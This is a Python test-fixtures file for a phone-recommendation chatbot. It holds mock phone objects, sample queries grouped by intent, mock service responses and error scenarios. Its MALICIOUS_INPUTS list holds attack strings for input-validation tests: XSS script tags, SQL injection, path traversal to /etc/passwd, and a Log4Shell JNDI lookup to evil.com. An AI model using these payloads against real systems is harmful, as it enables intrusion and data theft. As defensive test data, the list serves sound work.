"""
Test fixtures and mock data for contextual query tests
"""
from unittest.mock import Mock
from app.models.phone import Phone
from app.services.context_manager import ConversationContext


class TestDataFactory:
    """Factory for creating test data"""
    
    @staticmethod
    def create_mock_phone(id, brand, name, price, **kwargs):
        """Create a mock phone object with default values"""
        phone = Mock(spec=Phone)
        phone.id = id
        phone.brand = brand
        phone.name = name
        phone.price_original = price
        
        # Set default values
        phone.processor = kwargs.get('processor', 'Test Processor')
        phone.camera_main = kwargs.get('camera_main', '50MP')
        phone.battery_capacity = kwargs.get('battery_capacity', '5000mAh')
        phone.display_size = kwargs.get('display_size', '6.7')
        phone.storage_internal = kwargs.get('storage_internal', '256GB')
        phone.ram = kwargs.get('ram', '12GB')
        phone.os = kwargs.get('os', 'Android 13' if brand != 'Apple' else 'iOS 16')
        phone.network_5g = kwargs.get('network_5g', True)
        phone.camera_front = kwargs.get('camera_front', '12MP')
        phone.weight = kwargs.get('weight', '200g')
        phone.color_options = kwargs.get('color_options', ['Black', 'White'])
        phone.launch_date = kwargs.get('launch_date', '2023-01-01')
        phone.availability = kwargs.get('availability', 'Available')
        
        return phone
    
    @staticmethod
    def create_sample_phones():
        """Create a set of sample phones for testing"""
        return [
            TestDataFactory.create_mock_phone(
                1, "Apple", "iPhone 14 Pro", 120000,
                processor="A16 Bionic",
                camera_main="48MP",
                battery_capacity="3200mAh",
                os="iOS 16"
            ),
            TestDataFactory.create_mock_phone(
                2, "Samsung", "Galaxy S23 Ultra", 110000,
                processor="Snapdragon 8 Gen 2",
                camera_main="200MP",
                battery_capacity="5000mAh"
            ),
            TestDataFactory.create_mock_phone(
                3, "Google", "Pixel 7 Pro", 85000,
                processor="Google Tensor G2",
                camera_main="50MP",
                battery_capacity="5000mAh"
            ),
            TestDataFactory.create_mock_phone(
                4, "OnePlus", "11 Pro", 75000,
                processor="Snapdragon 8 Gen 2",
                camera_main="50MP",
                battery_capacity="5000mAh"
            ),
            TestDataFactory.create_mock_phone(
                5, "Xiaomi", "13 Pro", 70000,
                processor="Snapdragon 8 Gen 2",
                camera_main="50MP",
                battery_capacity="4820mAh"
            ),
            TestDataFactory.create_mock_phone(
                6, "Oppo", "Find X6 Pro", 68000,
                processor="Snapdragon 8 Gen 2",
                camera_main="50MP",
                battery_capacity="5000mAh"
            ),
            TestDataFactory.create_mock_phone(
                7, "Vivo", "X90 Pro", 65000,
                processor="MediaTek Dimensity 9200",
                camera_main="50MP",
                battery_capacity="4870mAh"
            ),
            TestDataFactory.create_mock_phone(
                8, "Realme", "GT 3", 45000,
                processor="Snapdragon 8+ Gen 1",
                camera_main="50MP",
                battery_capacity="5000mAh"
            ),
            TestDataFactory.create_mock_phone(
                9, "Nothing", "Phone 2", 55000,
                processor="Snapdragon 8+ Gen 1",
                camera_main="50MP",
                battery_capacity="4700mAh"
            ),
            TestDataFactory.create_mock_phone(
                10, "Motorola", "Edge 40 Pro", 50000,
                processor="Snapdragon 8 Gen 2",
                camera_main="50MP",
                battery_capacity="4600mAh"
            )
        ]
    
    @staticmethod
    def create_mock_context(session_id, user_id):
        """Create a mock user context"""
        context = Mock(spec=UserContext)
        context.session_id = session_id
        context.user_id = user_id
        context.phone_history = []
        context.query_history = []
        context.created_at = "2024-01-01T00:00:00"
        context.last_activity = "2024-01-01T00:00:00"
        
        # Mock methods
        context.add_phone_to_history = Mock()
        context.add_query_to_history = Mock()
        context.get_recent_phones = Mock(return_value=[])
        context.get_recent_queries = Mock(return_value=[])
        context.to_dict = Mock(return_value={
            'session_id': session_id,
            'user_id': user_id,
            'phone_history': [],
            'query_history': [],
            'created_at': "2024-01-01T00:00:00",
            'last_activity': "2024-01-01T00:00:00"
        })
        
        return context


class TestQuerySamples:
    """Sample queries for testing different intent types"""
    
    COMPARISON_QUERIES = [
        "Compare iPhone 14 Pro with Samsung Galaxy S23 Ultra",
        "iPhone vs Samsung which is better?",
        "Show me differences between OnePlus 11 and Pixel 7 Pro",
        "Compare camera quality of iPhone and Samsung",
        "Which has better battery life - iPhone or Samsung?"
    ]
    
    SPECIFICATION_QUERIES = [
        "What are the specs of iPhone 14 Pro?",
        "Tell me about Samsung Galaxy S23 camera",
        "Show me iPhone 14 Pro specifications",
        "What processor does Samsung Galaxy S23 have?",
        "How much RAM does OnePlus 11 have?"
    ]
    
    RECOMMENDATION_QUERIES = [
        "Recommend best phone under 50000",
        "Show me phones with good camera",
        "Which phone is best for gaming?",
        "Suggest phones with long battery life",
        "Best phone for photography under 80000"
    ]
    
    ALTERNATIVE_QUERIES = [
        "Show me alternatives to iPhone 14 Pro",
        "Similar phones to Samsung Galaxy S23",
        "Cheaper alternatives to iPhone",
        "Show me other options like OnePlus 11",
        "What are some alternatives with similar features?"
    ]
    
    CONTEXTUAL_QUERIES = [
        "Show me cheaper alternatives to it",
        "What about the camera quality?",
        "How does it compare in terms of battery?",
        "Are there similar phones from other brands?",
        "Which one should I choose?"
    ]
    
    QA_QUERIES = [
        "What is 5G technology?",
        "How does OLED display work?",
        "What is the difference between Android and iOS?",
        "Explain camera megapixels",
        "What does RAM do in a phone?"
    ]
    
    @classmethod
    def get_queries_by_intent(cls, intent_type):
        """Get sample queries for a specific intent type"""
        intent_map = {
            'comparison': cls.COMPARISON_QUERIES,
            'specification': cls.SPECIFICATION_QUERIES,
            'recommendation': cls.RECOMMENDATION_QUERIES,
            'alternative': cls.ALTERNATIVE_QUERIES,
            'contextual_recommendation': cls.CONTEXTUAL_QUERIES,
            'qa': cls.QA_QUERIES
        }
        return intent_map.get(intent_type, [])
    
    @classmethod
    def get_all_queries(cls):
        """Get all sample queries"""
        all_queries = []
        all_queries.extend(cls.COMPARISON_QUERIES)
        all_queries.extend(cls.SPECIFICATION_QUERIES)
        all_queries.extend(cls.RECOMMENDATION_QUERIES)
        all_queries.extend(cls.ALTERNATIVE_QUERIES)
        all_queries.extend(cls.CONTEXTUAL_QUERIES)
        all_queries.extend(cls.QA_QUERIES)
        return all_queries


class TestResponseTemplates:
    """Templates for mock AI service responses"""
    
    @staticmethod
    def create_comparison_response(phone_references=None, criteria=None):
        """Create a comparison intent response"""
        return {
            'intent_type': 'comparison',
            'confidence': 0.9,
            'phone_references': phone_references or [
                {'text': 'iPhone 14 Pro', 'type': 'explicit', 'context_index': None},
                {'text': 'Samsung Galaxy S23', 'type': 'explicit', 'context_index': None}
            ],
            'comparison_criteria': criteria or ['camera', 'performance', 'price'],
            'contextual_terms': [],
            'price_range': {'min': None, 'max': None},
            'specific_features': [],
            'query_focus': 'Compare phones based on specified criteria'
        }
    
    @staticmethod
    def create_specification_response(phone_reference=None, features=None):
        """Create a specification intent response"""
        return {
            'intent_type': 'specification',
            'confidence': 0.8,
            'phone_references': phone_reference or [
                {'text': 'iPhone 14 Pro', 'type': 'explicit', 'context_index': None}
            ],
            'comparison_criteria': [],
            'contextual_terms': [],
            'price_range': {'min': None, 'max': None},
            'specific_features': features or ['camera', 'processor', 'battery'],
            'query_focus': 'Get detailed specifications for specific phone'
        }
    
    @staticmethod
    def create_recommendation_response(price_range=None, features=None):
        """Create a recommendation intent response"""
        return {
            'intent_type': 'recommendation',
            'confidence': 0.85,
            'phone_references': [],
            'comparison_criteria': ['price', 'performance'],
            'contextual_terms': [],
            'price_range': price_range or {'min': None, 'max': 50000},
            'specific_features': features or ['camera', 'battery'],
            'query_focus': 'Recommend phones based on budget and requirements'
        }
    
    @staticmethod
    def create_contextual_response(context_reference=None, terms=None):
        """Create a contextual intent response"""
        return {
            'intent_type': 'contextual_recommendation',
            'confidence': 0.8,
            'phone_references': context_reference or [
                {'text': 'it', 'type': 'contextual', 'context_index': 0}
            ],
            'comparison_criteria': ['price'],
            'contextual_terms': terms or ['cheaper', 'alternatives'],
            'price_range': {'min': None, 'max': 80000},
            'specific_features': [],
            'query_focus': 'Find alternatives based on conversation context'
        }
    
    @staticmethod
    def create_qa_response(topic=None):
        """Create a Q&A intent response"""
        return {
            'intent_type': 'qa',
            'confidence': 0.7,
            'phone_references': [],
            'comparison_criteria': [],
            'contextual_terms': [],
            'price_range': {'min': None, 'max': None},
            'specific_features': [],
            'query_focus': f'Answer question about {topic or "technology"}'
        }


class TestErrorScenarios:
    """Common error scenarios for testing"""
    
    PHONE_NOT_FOUND_ERRORS = [
        "NonExistentPhone X1000",
        "FakePhone Pro Max",
        "InvalidBrand Model 123"
    ]
    
    MALFORMED_QUERIES = [
        "",  # Empty query
        "   ",  # Whitespace only
        "a",  # Too short
        "?" * 1000,  # Too long
        "\x00\x01\x02",  # Control characters
    ]
    
    MALICIOUS_INPUTS = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE phones; --",
        "../../etc/passwd",
        "javascript:alert('xss')",
        "${jndi:ldap://evil.com/a}"
    ]
    
    UNICODE_QUERIES = [
        "আইফোন ১৪ প্রো দাম কত?",  # Bengali
        "iPhone 14 Pro价格多少？",    # Chinese
        "iPhone 14 Proの価格は？",   # Japanese
        "iPhone 14 Pro की कीमत?",   # Hindi
        "iPhone 14 Pro цена?",       # Russian
        "iPhone 14 Pro 가격은?",     # Korean
        "🔥📱💯 iPhone specs? 🤔",   # Emojis
    ]


class MockServiceResponses:
    """Mock responses for various services"""
    
    @staticmethod
    def successful_integration_response(phones=None, intent_type="comparison"):
        """Create a successful integration service response"""
        return {
            "success": True,
            "phones": phones or TestDataFactory.create_sample_phones()[:3],
            "context_info": {
                "session_id": "test_session",
                "query_count": 1,
                "phone_count": len(phones) if phones else 3,
                "user_id": "test_user"
            },
            "query_analysis": {
                "intent_type": intent_type,
                "confidence": 0.9,
                "phone_references": [
                    {"text": "iPhone", "type": "explicit", "context_index": None}
                ],
                "comparison_criteria": ["camera", "performance"],
                "contextual_terms": [],
                "price_range": {"min": None, "max": None},
                "specific_features": [],
                "query_focus": f"Test {intent_type} query"
            },
            "response_metadata": {
                "processing_time": 0.5,
                "confidence": 0.9,
                "intent_type": intent_type,
                "timestamp": "2024-01-01T12:00:00Z"
            }
        }
    
    @staticmethod
    def error_integration_response(error_type="phone_resolution_error", error_code="PHONE_NOT_FOUND"):
        """Create an error integration service response"""
        return {
            "success": False,
            "error": "Phone not found in database",
            "error_type": error_type,
            "error_code": error_code,
            "suggestions": [
                "Check the spelling of the phone name",
                "Try using the full phone name",
                "Browse available phones"
            ],
            "context_info": {
                "session_id": "test_session",
                "query_count": 1,
                "phone_count": 0
            }
        }
    
    @staticmethod
    def performance_metrics_response():
        """Create a performance metrics response"""
        return {
            "total_queries": 1500,
            "successful_queries": 1425,
            "failed_queries": 75,
            "success_rate": 95.0,
            "error_rate": 5.0,
            "average_response_time": 0.42,
            "median_response_time": 0.35,
            "p95_response_time": 0.85,
            "p99_response_time": 1.2,
            "uptime_seconds": 86400,
            "last_updated": "2024-01-01T12:00:00Z",
            "active_sessions": 45,
            "total_sessions": 320
        }
    
    @staticmethod
    def error_statistics_response():
        """Create an error statistics response"""
        return {
            "total_errors": 75,
            "unique_error_types": 6,
            "by_type": {
                "phone_resolution_error": {
                    "count": 30,
                    "codes": ["PHONE_NOT_FOUND", "AMBIGUOUS_PHONE_NAME"]
                },
                "context_processing_error": {
                    "count": 20,
                    "codes": ["CONTEXT_FAILED", "CONTEXT_TIMEOUT"]
                },
                "filter_generation_error": {
                    "count": 10,
                    "codes": ["FILTER_FAILED", "INVALID_CRITERIA"]
                },
                "external_service_error": {
                    "count": 8,
                    "codes": ["GEMINI_AI_ERROR", "SERVICE_TIMEOUT"]
                },
                "validation_error": {
                    "count": 5,
                    "codes": ["VALIDATION_FAILED", "INVALID_INPUT"]
                },
                "database_error": {
                    "count": 2,
                    "codes": ["DB_CONNECTION_FAILED", "QUERY_TIMEOUT"]
                }
            },
            "by_severity": {
                "low": 25,
                "medium": 35,
                "high": 12,
                "critical": 3
            },
            "recent_errors": [
                {
                    "timestamp": "2024-01-01T11:55:00Z",
                    "type": "phone_resolution_error",
                    "code": "PHONE_NOT_FOUND",
                    "message": "Phone 'NonExistentPhone X1000' not found",
                    "severity": "medium"
                }
            ],
            "top_errors": [
                ("phone_resolution_error:PHONE_NOT_FOUND", 25),
                ("context_processing_error:CONTEXT_FAILED", 15),
                ("filter_generation_error:FILTER_FAILED", 8)
            ]
        }